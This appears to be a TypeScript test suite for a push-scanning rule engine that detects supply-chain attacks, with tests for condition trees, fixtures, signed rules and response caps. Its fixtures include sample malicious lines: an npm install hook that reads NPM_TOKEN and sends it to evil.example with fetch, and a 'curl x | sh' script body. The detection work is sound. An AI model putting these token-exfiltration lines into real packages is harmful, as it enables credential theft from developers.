import assert from "node:assert/strict"
import { createHash } from "node:crypto"
import { describe, test } from "node:test"
import type { Fact } from "@/lib/code-intel/types"
import type { PlatformRuleRow } from "@/lib/db"
import type { PushContext } from "@/lib/engine"
import { evaluateRules } from "@/lib/engine"
import { canonicalJson, generateSigningKeys, signingPayload, signPayload } from "@/lib/platform/signing"
import { selectStaffRules } from "@/lib/platform/staff-rules"
import { staffRuleSignedBody, verifyCheckScript, verifyStaffRule } from "@/lib/platform/verify"
import { evaluateAdvanced, runFixtures, windowFacts, type AdvancedInput } from "@/lib/rules/advanced/evaluate"
import { MAX_ADVANCED_RULES_PER_PUSH, MAX_RESPONSES_PER_PUSH } from "@/lib/rules/advanced/limits"
import { forEvaluation, planResponses } from "@/lib/rules/advanced/plan"
import { advancedToDraft, draftToAdvanced } from "@/lib/rules/draft-advanced"
import type { Condition } from "@/schemas/rule-advanced"
import { ruleSchema, type Rule } from "@/schemas/rule"
import { checkedRuleSchema } from "@/schemas/rule-safety"
import { staffRuleSchema, type StaffRule } from "@/schemas/staff-rule"

const DAY = 86_400_000

const fixture = (name: string, path: string, added: string[]) => ({ name, commits: [{ files: [{ path, change: "added" as const, added }] }] })

function staff(overrides: Partial<StaffRule> = {}): StaffRule {
  return staffRuleSchema.parse({
    id: "token-exfil",
    description: "Install hook exfiltrates a token",
    severity: "critical",
    pack: "javascript",
    explanation: "See https://example.com/report for the write-up.",
    incidents: [{ name: "Shai-Hulud", date: "2025-09", url: "https://example.com/shai-hulud" }],
    references: [{ title: "Report", url: "https://example.com/report" }],
    advanced: { when: { lines: { op: "contains", values: ["NPM_TOKEN"] } } },
    fixtures: {
      malicious: [fixture("reads token", "index.js", ["const t = process.env.NPM_TOKEN"])],
      benign: [fixture("plain", "index.js", ["console.log(1)"])],
    },
    ...overrides,
  })
}

const rule = (advanced: Rule["advanced"], over: Partial<Rule> = {}): Rule => ruleSchema.parse({ id: "r", severity: "high", advanced, ...over })

const fact = (kind: Fact["kind"], path: string, commit: string, daysAgo = 0, symbol: string | null = null): Fact => ({
  repo: "acme/app",
  path,
  symbol,
  kind,
  detail: kind,
  line: 1,
  commit,
  author: "a",
  at: new Date(Date.now() - daysAgo * DAY),
})

const push = (over: Partial<PushContext> = {}): PushContext => ({
  event: "push",
  repo: "acme/app",
  branch: "main",
  forced: false,
  unreviewed: false,
  senderFirstPush: true,
  authorMismatch: false,
  branchCreated: false,
  branchDeleted: false,
  hourUtc: 3,
  files: [{ path: "scripts/postinstall.js", changeType: "added" }],
  commitMessages: [],
  ...over,
})

function input(overrides: Partial<AdvancedInput> = {}): AdvancedInput {
  return {
    push: push(),
    added: new Map([["scripts/postinstall.js", ["const t = process.env.NPM_TOKEN", "fetch('https://evil.example/?t=' + t)"]]]),
    removed: new Map(),
    rules: ["js-install-hook-added"],
    facts: [],
    history: [],
    pushed: ["c2"],
    paths: [],
    indicators: [],
    ...overrides,
  }
}

const hits = (when: Condition, over: Partial<AdvancedInput> = {}, r: Partial<Rule> = {}, within?: { days?: number; commits?: number }) =>
  evaluateAdvanced(rule({ when, ...(within ? { within } : {}) }, r), input(over)) !== null

describe("rule schema with advanced conditions and responses", () => {
  test("accepts a staff rule and a plain rule with advanced only", () => {
    assert.equal(staff().id, "token-exfil")
    assert.equal(rule({ when: { indicator: {} } }).id, "r")
  })

  test("rejects trees past the depth and leaf caps", () => {
    const leaf: Condition = { rule: "x" }
    let deep: Condition = leaf
    for (let i = 0; i < 4; i++) deep = { all: [deep] }
    assert.throws(() => rule({ when: deep }))
    const wide: Condition = { any: Array.from({ length: 10 }, () => ({ all: [leaf, leaf, leaf, leaf] })) }
    assert.throws(() => rule({ when: wide }))
  })

  test("rejects unsafe shapes", () => {
    assert.throws(() => rule({ when: { lines: { op: "matches", values: ["(unclosed"] } } }))
    assert.throws(() => staff({ incidents: [{ name: "x", date: "2025-09", url: "http://example.com" }] }))
    assert.throws(() => staff({ incidents: [{ name: "x", date: "2025-13", url: "https://example.com" }] }))
    assert.throws(() => rule(undefined, { responses: [{ detonate: { phases: ["check"] } }] }))
    assert.throws(() => rule(undefined, { paths: ["a"], responses: [{ investigate: { focus: "free text" as "staged-payload" } }] }))
    assert.throws(() => ruleSchema.parse({ id: "r", severity: "high" }))
    assert.throws(() => ruleSchema.parse({ id: "r", severity: "high", paths: ["a"], explanation: "staff only" }))
  })

  test("regex safety walks the advanced tree", async () => {
    const unsafe = await checkedRuleSchema.safeParseAsync({ id: "r", severity: "high", advanced: { when: { lines: { op: "matches", values: ["(a+)+$"] } } } })
    assert.equal(unsafe.success, false)
    assert.deepEqual(unsafe.error?.issues[0].path, ["advanced", "when", "lines", "values", 0])
  })

  test("the pattern engine skips advanced rules", () => {
    assert.equal(evaluateRules([rule({ when: { indicator: {} } }, { paths: ["**"] })], push()).length, 0)
  })
})

describe("advanced leaves", () => {
  test("files", () => {
    assert.ok(hits({ files: { paths: ["scripts/**"], change: ["added"] } }))
    assert.ok(!hits({ files: { paths: ["scripts/**"], change: ["removed"] } }))
    assert.ok(!hits({ files: { paths: ["scripts/**"], exclude: ["**/*.js"] } }))
  })

  test("lines, every operator, scoped to files", () => {
    assert.ok(hits({ lines: { op: "contains", values: ["NPM_TOKEN"] } }))
    assert.ok(hits({ lines: { op: "starts_with", values: ["fetch("] } }))
    assert.ok(hits({ lines: { op: "ends_with", values: ["+ t)"] } }))
    assert.ok(hits({ lines: { op: "equals", values: ["const t = process.env.NPM_TOKEN"] } }))
    assert.ok(hits({ lines: { op: "matches", values: ["evil\\.example"] } }))
    assert.ok(!hits({ lines: { op: "contains", values: ["NPM_TOKEN"], files: ["src/**"] } }))
    assert.ok(!hits({ lines: { op: "contains", values: ["NPM_TOKEN"] } }, { added: new Map() }))
  })

  test("rule", () => {
    assert.ok(hits({ rule: "js-install-hook-added" }))
    assert.ok(!hits({ rule: "force-push" }))
  })

  test("facts need every kind, grouping, and a piece from this push", () => {
    const facts = [fact("secret_read", "a.js", "c1", 0, "t"), fact("network", "a.js", "c2"), fact("process", "b.js", "c2")]
    assert.ok(hits({ facts: { kinds: ["secret_read", "network"], same_file: true } }, { facts }))
    assert.ok(!hits({ facts: { kinds: ["secret_read", "process"], same_file: true } }, { facts }))
    assert.ok(hits({ facts: { kinds: ["secret_read", "process"] } }, { facts }))
    assert.ok(!hits({ facts: { kinds: ["secret_read", "network"], same_symbol: true } }, { facts }))
    assert.ok(!hits({ facts: { kinds: ["secret_read", "network"] } }, { facts, pushed: ["c9"] }))
  })

  test("path", () => {
    const ref = (path: string, line: number) => ({ repo: "acme/app", path, name: "run", kind: "function" as const, role: "definition" as const, line, endLine: line })
    const paths = [{ entry: { path: "package.json" }, hops: [{ ref: ref("scripts/postinstall.js", 1), facts: ["secret_read" as const], commit: "c2", author: null }], sink: "network" as const, score: 1 }]
    assert.ok(hits({ path: { entry: ["package.json"], sink: ["network"], through: ["secret_read"] } }, { paths }))
    assert.ok(!hits({ path: { sink: ["eval"] } }, { paths }))
    assert.ok(!hits({ path: { sink: ["network"], through: ["decode"] } }, { paths }))
  })

  test("indicator", () => {
    const indicators = [{ campaign: "Shai-Hulud", kind: "domain" }]
    assert.ok(hits({ indicator: { campaign: "shai-hulud" } }, { indicators }))
    assert.ok(hits({ indicator: { kind: "domain" } }, { indicators }))
    assert.ok(!hits({ indicator: { kind: "ip" } }, { indicators }))
  })

  test("context", () => {
    assert.ok(hits({ context: { sender_first_push: true, hour_utc: { between: [0, 5] } } }))
    assert.ok(!hits({ context: { forced: true } }))
    assert.ok(!hits({ context: { unreviewed: true } }, { push: push({ unreviewed: null }) }))
  })
})

describe("advanced trees, pattern part and scope", () => {
  test("all, any, not", () => {
    assert.ok(hits({ all: [{ rule: "js-install-hook-added" }, { lines: { op: "contains", values: ["NPM_TOKEN"] } }] }))
    assert.ok(!hits({ all: [{ rule: "js-install-hook-added" }, { rule: "force-push" }] }))
    assert.ok(hits({ any: [{ rule: "force-push" }, { rule: "js-install-hook-added" }] }))
    assert.ok(hits({ all: [{ rule: "js-install-hook-added" }, { not: { context: { forced: true } } }] }))
    assert.ok(!hits({ not: { rule: "js-install-hook-added" } }))
  })

  test("event, scope and pattern conditions AND with the tree", () => {
    const when: Condition = { rule: "js-install-hook-added" }
    assert.ok(!hits(when, {}, { on: ["pull_request"] }))
    assert.ok(!hits(when, {}, { repos: ["other/*"] }))
    assert.ok(!hits(when, {}, { branches: ["release/*"] }))
    assert.ok(hits(when, {}, { paths: ["scripts/**"] }))
    assert.ok(!hits(when, {}, { paths: ["src/**"] }))
    assert.ok(!hits(when, {}, { added_lines: "nothing-like-this" }))
  })

  test("evidence carries matched files and lines", () => {
    const hit = evaluateAdvanced(rule({ when: { lines: { op: "contains", values: ["NPM_TOKEN"] } } }), input())
    assert.deepEqual(hit?.evidence.files, ["scripts/postinstall.js"])
    assert.deepEqual(hit?.evidence.lines, ["const t = process.env.NPM_TOKEN"])
  })
})

describe("within windows over fact history", () => {
  const history = [fact("network", "a.js", "c3", 1), fact("decode", "b.js", "c2", 10), fact("eval", "c.js", "c1", 40)]

  test("days and commits narrow the window", () => {
    assert.deepEqual(windowFacts(history, { days: 30 }).map((f) => f.commit), ["c3", "c2"])
    assert.deepEqual(windowFacts(history, { commits: 1 }).map((f) => f.commit), ["c3"])
    assert.deepEqual(windowFacts(history, { commits: 3, days: 5 }).map((f) => f.commit), ["c3"])
  })

  test("a staged attack completes across commits, including removed facts", () => {
    const when: Condition = { facts: { kinds: ["network", "decode", "eval"] } }
    assert.ok(hits(when, { history, pushed: ["c3"] }, {}, { days: 60 }))
    assert.ok(!hits(when, { history, pushed: ["c3"] }, {}, { days: 30 }))
    assert.ok(!hits(when, { history, pushed: ["c9"] }, {}, { days: 60 }))
    assert.ok(!hits(when, { history, facts: [] }))
  })
})

describe("fixtures runner", () => {
  test("a staff rule passes its own fixtures", async () => {
    const result = await runFixtures(staff())
    assert.equal(result.passed, true, JSON.stringify(result.results))
  })

  test("a fixture that does not behave fails the run, and no fixtures is no pass", async () => {
    const wrong = staff({ fixtures: { malicious: [fixture("benign really", "a.js", ["x"])], benign: [fixture("b", "a.js", ["NPM_TOKEN"])] } })
    const result = await runFixtures(wrong)
    assert.equal(result.passed, false)
    assert.deepEqual(result.results.map((r) => r.got), ["clean", "hit"])
    assert.equal((await runFixtures(staff({ fixtures: undefined }))).passed, false)
  })

  test("facts and history come from an in-memory store across commits", async () => {
    const staged = staff({
      advanced: {
        when: { all: [{ facts: { kinds: ["secret_read", "network"], same_file: true } }, { facts: { kinds: ["install_hook"] } }] },
        within: { commits: 5 },
      },
      fixtures: {
        malicious: [
          {
            name: "hook first, payload later",
            commits: [
              { files: [{ path: "package.json", change: "added", added: ['{', ' "scripts": { "postinstall": "node scripts/postinstall.js" }', '}'] }] },
              { files: [{ path: "scripts/postinstall.js", change: "added", added: ["const t = process.env.NPM_TOKEN", 'fetch("https://evil.example/x?t=" + t)'] }] },
            ],
          },
        ],
        benign: [fixture("payload without hook", "scripts/postinstall.js", ["const t = process.env.NPM_TOKEN", 'fetch("https://evil.example/x?t=" + t)'])],
      },
    })
    const result = await runFixtures(staged)
    assert.equal(result.passed, true, JSON.stringify(result.results))
  })
})

describe("signatures and staff rule loading", () => {
  const keys = generateSigningKeys()
  const row = (over: Partial<PlatformRuleRow> = {}, body: StaffRule = staff()): PlatformRuleRow => {
    const status = over.status ?? "published"
    const version = over.version ?? 1
    return {
      id: body.id,
      version,
      body,
      status,
      signature: signPayload(signingPayload(body.id, version, staffRuleSignedBody(body, status)), keys.privateKey),
      signedBy: "staff",
      createdBy: "staff",
      createdAt: new Date(),
      publishedAt: new Date(),
      ...over,
    }
  }

  test("verifies a signed row and refuses tampering, including a flipped status", () => {
    assert.ok(verifyStaffRule(row(), keys.publicKey))
    assert.ok(!verifyStaffRule({ ...row(), body: { ...staff(), severity: "low" } }, keys.publicKey))
    assert.ok(!verifyStaffRule({ ...row(), version: 2 }, keys.publicKey))
    assert.ok(!verifyStaffRule({ ...row({ status: "shadow" }), status: "published" }, keys.publicKey))
    assert.ok(!verifyStaffRule(row({ signature: null }), keys.publicKey))
    assert.ok(!verifyStaffRule(row(), generateSigningKeys().publicKey))
  })

  test("an invalid or unsigned row is never loaded; staff fields stay out of the rule", () => {
    assert.equal(selectStaffRules([row({ signature: "AAAA" })], keys.publicKey, false).live.size, 0)
    assert.equal(selectStaffRules([row()], null, false).live.size, 0)
    const live = selectStaffRules([row()], keys.publicKey, false).live.get("token-exfil")
    assert.ok(live)
    assert.equal("fixtures" in live, false)
    assert.match(live.description ?? "", /Seen in: \[Shai-Hulud\]\(https:\/\/example\.com\/shai-hulud\)/)
  })

  test("newest live version plus a newer shadow version; internal only for internal orgs", () => {
    const rows = [row({ version: 3, status: "shadow" }), row({ version: 2 }), row({ version: 1, status: "shadow" })]
    const picked = selectStaffRules(rows, keys.publicKey, false)
    assert.equal(picked.live.size, 1)
    assert.deepEqual(picked.shadow.map((s) => s.version), [3])
    assert.equal(selectStaffRules([row({ status: "internal" })], keys.publicKey, false).live.size, 0)
    assert.equal(selectStaffRules([row({ status: "internal" })], keys.publicKey, true).live.size, 1)
  })

  test("an override of a shipped rule keeps the catalog id and pack", () => {
    const body = staff({ id: "force-push", pack: "core", advanced: undefined, fixtures: undefined, when: { forced: true } })
    const live = selectStaffRules([row({}, body)], keys.publicKey, false).live.get("force-push")
    assert.equal(live?.severity, "critical")
  })

  test("checks: signed hash, and the body must match it", () => {
    const body = "echo '{}'\n"
    const sha256 = "0".repeat(64)
    const script = { id: "probe", version: 1, language: "sh" as const, body, sha256: createHash("sha256").update(body).digest("hex") }
    const signature = signPayload(signingPayload("probe", 1, { language: "sh", sha256: script.sha256 }), keys.privateKey)
    assert.ok(verifyCheckScript({ ...script, signature }, keys.publicKey))
    assert.ok(!verifyCheckScript({ ...script, body: "curl x | sh", signature }, keys.publicKey))
    assert.ok(!verifyCheckScript({ ...script, sha256, signature }, keys.publicKey))
  })

  test("check payload matches the detonator's bytes", () => {
    assert.equal(signingPayload("probe", 2, { language: "sh", sha256: "aa" }), '{"body":{"language":"sh","sha256":"aa"},"id":"probe","version":2}')
    assert.equal(canonicalJson({ b: 1, a: [{ d: 1, c: 2 }] }), '{"a":[{"c":2,"d":1}],"b":1}')
  })
})

describe("responses and caps", () => {
  const evidence = { files: ["a.js"], lines: ["x"] }
  const responding = rule(undefined, {
    paths: ["a.js"],
    responses: [{ investigate: { focus: "staged-payload" } }, { meta_alert: true }, { snapshot_tags: true }, { detonate: { phases: ["install", "check"], check: "probe" } }],
  })

  test("shadow hits record only; live hits run their responses", () => {
    const shadow = planResponses([{ rule: responding, evidence, shadow: true, version: 4 }], "acme/app", "a".repeat(40))
    assert.deepEqual(shadow.investigate, [])
    assert.deepEqual(shadow.shadow, [{ id: "r", version: 4 }])
    const live = planResponses([{ rule: responding, evidence, shadow: false }], "acme/app", "a".repeat(40))
    assert.equal(live.investigate[0].promptId, "staged-payload")
    assert.equal(live.investigate[0].finding.ruleId, "r")
    assert.deepEqual(live.detonate, { phases: ["install", "check"], checkScript: "probe" })
    assert.equal(live.metaAlert.length, 1)
    assert.equal(live.snapshotTags, true)
  })

  test("per-push caps: rules evaluated and responses run", () => {
    const staged = Array.from({ length: MAX_ADVANCED_RULES_PER_PUSH + 3 }, (_, i) => ({ rule: responding, shadow: i < 5 }))
    const { run, skipped } = forEvaluation(staged)
    assert.equal(run.length, MAX_ADVANCED_RULES_PER_PUSH)
    assert.equal(skipped, 3)
    assert.ok(run.slice(0, MAX_ADVANCED_RULES_PER_PUSH - 5).every((a) => !a.shadow))
    const many = Array.from({ length: MAX_RESPONSES_PER_PUSH + 4 }, () => ({ rule: rule(undefined, { paths: ["a"], responses: [{ meta_alert: true as const }] }), evidence, shadow: false }))
    const plan = planResponses(many, "acme/app", "a".repeat(40))
    assert.equal(plan.metaAlert.length, MAX_RESPONSES_PER_PUSH)
    assert.equal(plan.droppedResponses, 4)
  })
})

describe("editor round trip", () => {
  test("simple trees become rows and come back unchanged; others stay raw", () => {
    const simple = { when: { all: [{ facts: { kinds: ["network" as const], same_file: true } }, { indicator: { kind: "domain" as const } }] }, within: { days: 30 } }
    assert.deepEqual(draftToAdvanced(advancedToDraft(simple)), simple)
    const complex = { when: { any: [{ rule: "a" }, { rule: "b" }] } }
    assert.equal(advancedToDraft(complex).raw, complex)
  })
})
